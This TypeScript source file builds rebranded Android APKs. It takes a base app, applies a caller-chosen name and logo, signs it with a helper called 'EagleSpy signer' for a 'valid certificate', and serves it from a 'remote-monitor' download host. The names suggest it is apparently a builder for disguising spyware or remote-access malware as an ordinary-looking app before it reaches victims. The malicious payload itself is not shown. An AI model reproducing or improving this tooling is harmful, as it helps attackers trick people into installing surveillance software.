import * as path from 'path';
import * as fs from 'fs';
import { customizeAPKFixed } from './apk-customizer-fixed';
import { signAPKEagleSpy } from './apk-signer-eaglespy';

interface APKBuilderOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
  requestOrigin?: string;
}

/**
 * Build customized APK with app name and logo
 */
export async function buildCustomizedAPK(options: APKBuilderOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  try {
    console.log(`[APK-BUILDER-CUSTOM] Starting customized APK build for: ${options.appName}`);
    console.log(`[APK-BUILDER-CUSTOM] URL: ${options.appUrl}`);

    // Find base APK
    const baseAPKDir = path.join(process.cwd(), 'public', 'apks');
    const baseAPK = path.join(baseAPKDir, 'Blockchain-Registered.apk');

    if (!fs.existsSync(baseAPK)) {
      throw new Error(`Base APK not found at ${baseAPK}`);
    }

    console.log(`[APK-BUILDER-CUSTOM] Found base APK at: ${baseAPK}`);

    // Get base APK size
    const baseStats = fs.statSync(baseAPK);
    console.log(`[APK-BUILDER-CUSTOM] Base APK size: ${(baseStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Generate output filename
    const sanitizedName = options.appName
      .toLowerCase()
      .replace(/[^a-z0-9]/g, '')
      .substring(0, 20);
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const finalAPKName = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;

    // Output directory
    const outputDir = baseAPKDir;
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    const finalAPKPath = path.join(outputDir, finalAPKName);
    console.log(`[APK-BUILDER-CUSTOM] Final APK path: ${finalAPKPath}`);

    // Customize the APK with new app name and icons
    console.log(`[APK-BUILDER-CUSTOM] Customizing APK with app name: ${options.appName}`);
    try {
      const customizedApkPath = await customizeAPKFixed({
        apkPath: baseAPK,
        appName: options.appName,
        outputPath: finalAPKPath,
        logoUrl: options.logoUrl,
      });
      console.log(`[APK-BUILDER-CUSTOM] ✓ APK customization completed: ${customizedApkPath}`);
    } catch (customizeError) {
      console.error('[APK-BUILDER-CUSTOM] Customization failed:', customizeError);
      return {
        success: false,
        error: `APK customization failed: ${customizeError instanceof Error ? customizeError.message : String(customizeError)}`,
      };
    }

    // Verify the customized APK file
    if (!fs.existsSync(finalAPKPath)) {
      throw new Error('Failed to create customized APK');
    }

    let customizedStats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-CUSTOM] Customized APK size: ${(customizedStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Sign the APK with valid certificate using EagleSpy signer
    console.log(`[APK-BUILDER-CUSTOM] Signing APK with valid certificate (EagleSpy signer)...`);
    const signResult = await signAPKEagleSpy({
      apkPath: finalAPKPath,
    });

    if (!signResult.success) {
      console.warn(`[APK-BUILDER-CUSTOM] APK signing failed:`, signResult.error);
      // Continue anyway - try to use the unsigned APK
    } else {
      console.log(`[APK-BUILDER-CUSTOM] ✓ APK signed successfully`);
    }

    const finalStats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-CUSTOM] Final APK size: ${(finalStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Build the download URL - use Railway domain for proper header handling
    const downloadUrl = `https://remote-monitor-production.up.railway.app/download/${finalAPKName}`;
    console.log(`[APK-BUILDER-CUSTOM] Download URL: ${downloadUrl}`);
    console.log(`[APK-BUILDER-CUSTOM] APK saved at: ${finalAPKPath}`);
    console.log(`[APK-BUILDER-CUSTOM] File size: ${(finalStats.size / 1024 / 1024).toFixed(2)}MB`);

    return {
      success: true,
      apkPath: finalAPKPath,
      downloadUrl: downloadUrl,
      filename: finalAPKName,
    };
  } catch (error) {
    console.error('[APK-BUILDER-CUSTOM] Error:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}
